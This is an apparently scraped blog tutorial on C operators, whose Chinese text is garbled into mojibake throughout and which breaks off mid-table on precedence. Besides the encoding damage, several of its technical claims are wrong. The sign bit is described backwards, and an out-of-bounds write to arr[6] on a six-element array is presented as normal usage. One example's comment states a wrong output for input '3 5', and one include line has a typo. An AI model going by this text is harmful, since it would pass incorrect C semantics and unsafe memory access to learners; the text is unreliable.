        <content type="html"><![CDATA[<p>Cçš„æ¢ç´¢ç¢ç‰‡â€”â€”æ“ä½œç¬¦</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/2f25a996e53a0589036894fc5c92a086.gif" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><ol><li><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3></li></ol><p>ç®—æœ¯æ“ä½œç¬¦</p><p>ç§»ä½æ“ä½œç¬¦</p><p>ä½æ“ä½œç¬¦</p><p>èµ‹å€¼æ“ä½œç¬¦</p><p>å•ç›®æ“ä½œç¬¦</p><p>å…³ç³»æ“ä½œç¬¦</p><p>é€»è¾‘æ“ä½œç¬¦</p><p>æ¡ä»¶æ“ä½œç¬¦</p><p>é€—å·è¡¨è¾¾å¼</p><p>ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜</p><h4 id="ä¸€-ç®—æ•°æ“ä½œç¬¦"><a href="#ä¸€-ç®—æ•°æ“ä½œç¬¦" class="headerlink" title="ä¸€.ç®—æ•°æ“ä½œç¬¦"></a>ä¸€.ç®—æ•°æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+  -  *  /  % </span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>+ã€-ã€*æ­¤ç±»æ•°å­¦ä¸­å¸¸è§çš„ç®—æ•°ç¬¦å·æˆ‘ä»¬å†ç†Ÿæ‚‰ä¸è¿‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯&#x2F;ï¼ˆé™¤ï¼‰ï¼Œ%ï¼ˆå–ä½™ï¼‰ä¹‹é—´çš„åŒºåˆ«ã€‚</p><p>ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio,h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a/<span class="number">3</span>);<span class="comment">//ç»“æœä¸º3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a%<span class="number">3</span>);<span class="comment">//ç»“æœä¸º1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ³¨æ„ï¼š1.é™¤%æ“ä½œç¬¦ä¹‹å¤–ã€‚å…¶ä»–å‡ ä¸ªæ“ä½œç¬¦å¯ä»¥ä½œç”¨äºæ•´æ•°å’Œæµ®ç‚¹æ•°ã€‚</p><p>2.&#x2F;æ“ä½œç¬¦è¿ç®—æ—¶è‹¥ä¸¤ä¸ªæ“ä½œæ•°ä¸­å«æµ®ç‚¹æ•°åˆ™æ‰§è¡Œæµ®ç‚¹æ•°é™¤æ³•ï¼ˆ%lfæ‰“å°ç»“æœï¼‰ï¼›è‹¥ä¸¤æ“ä½œæ•°éƒ½ä¸ºæ•´æ•°åˆ™æ‰§è¡Œæ•´æ•°é™¤æ³•ã€‚</p><p>3.%æ“ä½œç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºæ•´æ•°ã€‚</p><h4 id="äºŒã€ç§»ä½æ“ä½œç¬¦"><a href="#äºŒã€ç§»ä½æ“ä½œç¬¦" class="headerlink" title="äºŒã€ç§»ä½æ“ä½œç¬¦"></a>äºŒã€ç§»ä½æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;  å·¦ç§»æ“ä½œç¬¦</span><br><span class="line">&gt;&gt;  å³ç§»æ“ä½œç¬¦</span><br><span class="line">æ³¨ï¼šç§»ä½æ“ä½œç¬¦çš„æ“ä½œæ•°åªèƒ½æ˜¯æ•´æ•°ã€‚</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><em>ç§»ä½æ“ä½œç¬¦ç§»åŠ¨çš„æ˜¯äºŒè¿›åˆ¶çš„ä½ï¼Œ</em>è€Œæ•´æ•°åœ¨å†…å­˜ä¸­ä»¥è¡¥ç çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå±å¹•ä¸Šåˆä»¥åŸç æ˜¾ç¤ºã€‚</p><p>è¡¥å……ï¼š</p><p><strong>åŸç </strong>ï¼šæŠŠä¸€ä¸ªæ•°æŒ‰æ­£è´Ÿç›´æ¥ç¿»è¯‘æˆäºŒè¿›åˆ¶ï¼›</p><p><strong>åç </strong>ï¼šå¯¹åŸç è¿›è¡ŒæŒ‰ä½å–ï¼ˆå³0å˜ä¸º1ï¼Œ1å˜ä¸º0ï¼‰åå¾—åˆ°åç ï¼›</p><p><strong>è¡¥ç </strong>ï¼šåç +1å¾—è¡¥ç ã€‚</p><p>å¯¹äºæ­£æ•´æ•°åŸç åç è¡¥ç ç›¸åŒï¼Œè´Ÿæ•´æ•°åˆ™éœ€è®¡ç®—ã€‚</p><p>è®¡ç®—æ–¹æ³•ï¼šåŸç ç¬¦å·ä½ï¼ˆäºŒè¿›åˆ¶è¡¨ç¤ºçš„æœ€é«˜ä¸€ä½ï¼Œæ˜¯0è¡¨ç¤ºä¸ºè´Ÿæ•°ï¼Œæ˜¯1è¡¨ç¤ºä¸ºæ­£æ•°ï¼‰ä¸å˜ï¼Œå…¶ä»–ä½æŒ‰ä½å–åå¾—åˆ°åç ï¼Œ+1å¾—åˆ°è¡¥ç ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/577aafbe300b6819adb36ad9ca0b8713.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç§»ä½è§„åˆ™ï¼š</p><ol><li>å·¦ç§»æ“ä½œç¬¦ï¼šå·¦è¾¹æŠ›å¼ƒã€å³è¾¹è¡¥0ã€‚</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/7dea2e4433fabdfafcc5e51f99be91f8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><ol><li>å³ç§»æ“ä½œç¬¦ï¼ˆç”±ç¼–è¯‘å™¨å†³å®šï¼‰ï¼š</li></ol><p>é€»è¾‘ç§»ä½</p><p>å·¦è¾¹ç”¨0å¡«å……ï¼Œå³è¾¹ä¸¢å¼ƒã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97b52d3e735c5b8e80b4087060038946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç®—æœ¯ç§»ä½</p><p>å·¦è¾¹ç”¨åŸè¯¥å€¼çš„ç¬¦å·ä½å¡«å……ï¼Œå³è¾¹ä¸¢å¼ƒã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c94a1583fad019f42f8fafa14d6897e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>è­¦å‘Šâš ï¼š</p><p>å¯¹äºç§»ä½è¿ç®—ç¬¦ï¼Œä¸è¦ç§»åŠ¨è´Ÿæ•°ä½ï¼Œè¿™ä¸ªæ˜¯æ ‡å‡†æœªå®šä¹‰çš„ã€‚</p><h4 id="ä¸‰ã€ä½æ“ä½œç¬¦"><a href="#ä¸‰ã€ä½æ“ä½œç¬¦" class="headerlink" title="ä¸‰ã€ä½æ“ä½œç¬¦"></a>ä¸‰ã€ä½æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;//æŒ‰ä½ä¸</span><br><span class="line">|//æŒ‰ä½æˆ–</span><br><span class="line">^//æŒ‰ä½å¼‚æˆ–</span><br><span class="line">æ³¨ï¼šå®ƒä»¬çš„æ“ä½œæ•°å¿…é¡»ä¸ºæ•´æ•°ã€‚</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>å‡å¯¹äºŒè¿›åˆ¶è¿›è¡Œæ“ä½œã€‚</p><p>&amp;ï¼šæœ‰0ä¸º0ï¼Œå‡1ä¸º1ï¼›</p><p>|ï¼šæœ‰ 1ä¸º1ï¼Œå‡0ä¸º0ï¼›</p><p>^ï¼šç›¸åŒä¸º0ï¼Œç›¸å¼‚ä¸º1ï¼Œä¸”ä¿è¯ä¸ä¼šæ ˆæº¢å‡ºã€‚</p><p>å°tipï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a ^ a = 0;</span><br><span class="line">0 ^ a = a;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å››ã€èµ‹å€¼æ“ä½œç¬¦"><a href="#å››ã€èµ‹å€¼æ“ä½œç¬¦" class="headerlink" title="å››ã€èµ‹å€¼æ“ä½œç¬¦"></a>å››ã€èµ‹å€¼æ“ä½œç¬¦</h4><p>å…¶å®å°±æ˜¯å¯¹â€œ&#x3D;â€çš„è¿ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">èµ‹å€¼æ“ä½œç¬¦å¯ä»¥è¿ç»­ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š</span><br><span class="line">int a = 10;</span><br><span class="line">int x = 0;</span><br><span class="line">int y = 20;</span><br><span class="line">a = x = y+1;//è¿ç»­èµ‹å€¼</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><strong>å¤åˆèµ‹å€¼ç¬¦</strong></p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>&gt;&gt;&#x3D;</p><p>&lt;&lt;&#x3D;</p><p>&amp;&#x3D;</p><p>|&#x3D;</p><p>^&#x3D;</p><p>å¯ä»¥è‡ªå·±è¿›è¡Œå®è·µæ¢ç´¢å…·ä½“åŠŸèƒ½ğŸŒ¸</p><h4 id="äº”ã€å•ç›®æ“ä½œç¬¦"><a href="#äº”ã€å•ç›®æ“ä½œç¬¦" class="headerlink" title="äº”ã€å•ç›®æ“ä½œç¬¦"></a>äº”ã€å•ç›®æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">! é€»è¾‘åæ“ä½œ</span><br><span class="line">- è´Ÿå€¼</span><br><span class="line">+ æ­£å€¼</span><br><span class="line">&amp; å–åœ°å€</span><br><span class="line">sizeof æ“ä½œæ•°çš„ç±»å‹é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span><br><span class="line">~ å¯¹ä¸€ä¸ªæ•°çš„äºŒè¿›åˆ¶æŒ‰ä½å–å</span><br><span class="line">-- å‰ç½®ã€åç½®--</span><br><span class="line">++ å‰ç½®ã€åç½®++</span><br><span class="line">* é—´æ¥è®¿é—®æ“ä½œç¬¦(è§£å¼•ç”¨æ“ä½œç¬¦)</span><br><span class="line">(ç±»å‹) å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å…­ã€å…³ç³»æ“ä½œç¬¦"><a href="#å…­ã€å…³ç³»æ“ä½œç¬¦" class="headerlink" title="å…­ã€å…³ç³»æ“ä½œç¬¦"></a>å…­ã€å…³ç³»æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&gt;=</span><br><span class="line">&lt;</span><br><span class="line">&lt;=</span><br><span class="line">!= ç”¨äºæµ‹è¯•â€œä¸ç›¸ç­‰â€</span><br><span class="line">== ç”¨äºæµ‹è¯•â€œç›¸ç­‰â€</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ³¨æ„ï¼šç¼–ç¨‹è¿‡ç¨‹ä¸­ä¸è¦æ··æ·†&#x3D;&#x3D;å’Œ&#x3D;ï¼Œä¸ç„¶ä¼šå˜æˆbugå°å­ã€‚</p><h4 id="ä¸ƒã€é€»è¾‘æ“ä½œç¬¦"><a href="#ä¸ƒã€é€»è¾‘æ“ä½œç¬¦" class="headerlink" title="ä¸ƒã€é€»è¾‘æ“ä½œç¬¦"></a>ä¸ƒã€é€»è¾‘æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; é€»è¾‘ä¸</span><br><span class="line">|| é€»è¾‘æˆ–</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>åŒºåˆ†<strong>é€»è¾‘ä¸</strong>å’Œ<strong>æŒ‰ä½ä¸</strong></p><p>åŒºåˆ†<strong>é€»è¾‘æˆ–</strong>å’Œ<strong>æŒ‰ä½æˆ–</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&amp;2-----&gt;0</span><br><span class="line">1&amp;&amp;2----&gt;1</span><br><span class="line">1|2-----&gt;3</span><br><span class="line">1||2----&gt;1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="å…«ã€æ¡ä»¶æ“ä½œç¬¦"><a href="#å…«ã€æ¡ä»¶æ“ä½œç¬¦" class="headerlink" title="å…«ã€æ¡ä»¶æ“ä½œç¬¦"></a>å…«ã€æ¡ä»¶æ“ä½œç¬¦</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1 ? exp2 : exp3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>æ‡’é¬¼æ‡’å¾—è§£é‡Šäº†ç›´æ¥ä¸ŠğŸŒ°</p><p>ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a, b;</span><br><span class="line">    scanf(&quot;%d%d&quot;, &amp;a, &amp;b);</span><br><span class="line">    int c = (a &gt; b) ? a : b;</span><br><span class="line">    printf(&quot;%d&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;//è¾“å…¥5 3 ç»“æœä¸º5 è¾“å…¥3 5 ç»“æœä¸º3</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><h4 id="ä¹ã€é€—å·è¡¨è¾¾å¼"><a href="#ä¹ã€é€—å·è¡¨è¾¾å¼" class="headerlink" title="ä¹ã€é€—å·è¡¨è¾¾å¼"></a>ä¹ã€é€—å·è¡¨è¾¾å¼</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp1, exp2, exp3, â€¦expN</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>é€—å·è¡¨è¾¾å¼ï¼Œå°±æ˜¯ç”¨é€—å·éš”å¼€çš„å¤šä¸ªè¡¨è¾¾å¼ã€‚</p><p>é€—å·è¡¨è¾¾å¼ï¼Œä»å·¦å‘å³ä¾æ¬¡æ‰§è¡Œã€‚æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæ˜¯æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚</p><h4 id="åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜"><a href="#åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜" class="headerlink" title="åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜"></a>åã€ä¸‹æ ‡å¼•ç”¨ã€å‡½æ•°è°ƒç”¨å’Œç»“æ„æˆå‘˜</h4><p>\1. [ ] ä¸‹æ ‡å¼•ç”¨æ“ä½œç¬¦</p><p>æ“ä½œæ•°ï¼šä¸€ä¸ªæ•°ç»„å + ä¸€ä¸ªç´¢å¼•å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int arr[6];//åˆ›å»ºæ•°ç»„</span><br><span class="line">arr[6] = 10;//å®ç”¨ä¸‹æ ‡å¼•ç”¨æ“ä½œç¬¦ã€‚</span><br><span class="line">[ ]çš„ä¸¤ä¸ªæ“ä½œæ•°æ˜¯arrå’Œ6</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>\2. ( ) å‡½æ•°è°ƒç”¨æ“ä½œç¬¦</p><p>æ¥å—ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ“ä½œæ•°ï¼šç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯å‡½æ•°åï¼Œå‰©ä½™çš„æ“ä½œæ•°å°±æ˜¯ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hehe\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">test1(); <span class="comment">//å®ç”¨ï¼ˆï¼‰ä½œä¸ºå‡½æ•°è°ƒç”¨æ“ä½œç¬¦ã€‚</span></span><br><span class="line">test2(<span class="string">&quot;hello bit.&quot;</span>);<span class="comment">//å®ç”¨ï¼ˆï¼‰ä½œä¸ºå‡½æ•°è°ƒç”¨æ“ä½œç¬¦ã€‚</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p>\3. è®¿é—®ä¸€ä¸ªç»“æ„çš„æˆå‘˜</p><table><thead><tr><th>. - &gt;</th><th>ç»“æ„ä½“.æˆå‘˜å ç»“æ„ä½“æŒ‡é’ˆ-&gt;æˆå‘˜å</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s.num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s.c);</span><br><span class="line">&#125;<span class="comment">//æ‰“å°å‡º6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num ;</span><br><span class="line">    <span class="type">char</span> c ;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="keyword">struct</span> S* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, p-&gt;c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">S</span> <span class="title">s</span> =</span> &#123;<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line">    test(&amp;s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//æ‰“å°å‡º6 a</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><ol><li><h3 id="æ“ä½œç¬¦å±æ€§"><a href="#æ“ä½œç¬¦å±æ€§" class="headerlink" title="æ“ä½œç¬¦å±æ€§"></a>æ“ä½œç¬¦å±æ€§</h3></li></ol><p>*<strong>å¤æ‚è¡¨è¾¾å¼çš„æ±‚å€¼æœ‰ä¸‰ä¸ªå½±å“çš„å› ç´ ï¼š*</strong></p><p>\1. æ“ä½œç¬¦çš„ä¼˜å…ˆçº§</p><p>\2. æ“ä½œç¬¦çš„ç»“åˆæ€§</p><p>\3. æ˜¯å¦æ§åˆ¶æ±‚å€¼é¡ºåºã€‚</p><p>ğŸ’«<strong>ä¸¤ä¸ªç›¸é‚»çš„æ“ä½œç¬¦å…ˆæ‰§è¡Œå“ªä¸ªï¼Ÿå–å†³äºä»–ä»¬çš„ä¼˜å…ˆçº§ï¼›å¦‚æœä¸¤è€…çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œå–å†³äºä»–ä»¬çš„ç»“åˆæ€§ã€‚</strong></p><ol><li><h3 id="æ“ä½œç¬¦çš„ä¼˜å…ˆçº§"><a href="#æ“ä½œç¬¦çš„ä¼˜å…ˆçº§" class="headerlink" title="æ“ä½œç¬¦çš„ä¼˜å…ˆçº§"></a>æ“ä½œç¬¦çš„ä¼˜å…ˆçº§</h3></li></ol><table><thead><tr><th>æ“ä½œ ç¬¦</th><th>æè¿°</th><th>ç”¨æ³•ç¤ºä¾‹</th><th>ç»“æœç±»å‹</th><th>ç»“åˆæ€§</th><th>æ˜¯å¦æ§åˆ¶æ±‚å€¼é¡ºåº</th></tr></thead><tbody><tr><td>ï¼ˆï¼‰</td><td>èšç»„</td><td>ï¼ˆè¡¨è¾¾å¼ï¼‰</td><td>ä¸è¡¨è¾¾ å¼åŒ</td><td>N&#x2F;Aï¼ˆä¸é€‚ç”¨ï¼‰</td><td>å¦</td></tr><tr><td>ï¼ˆï¼‰</td><td>å‡½æ•°è°ƒç”¨</td><td>rexpï¼ˆrexpï¼Œâ€¦,rexpï¼‰</td><td>rexp</td><td>L-Rï¼ˆå·¦åˆ°å³ï¼‰</td><td>å¦</td></tr><tr><td>[ ]</td><td>ä¸‹æ 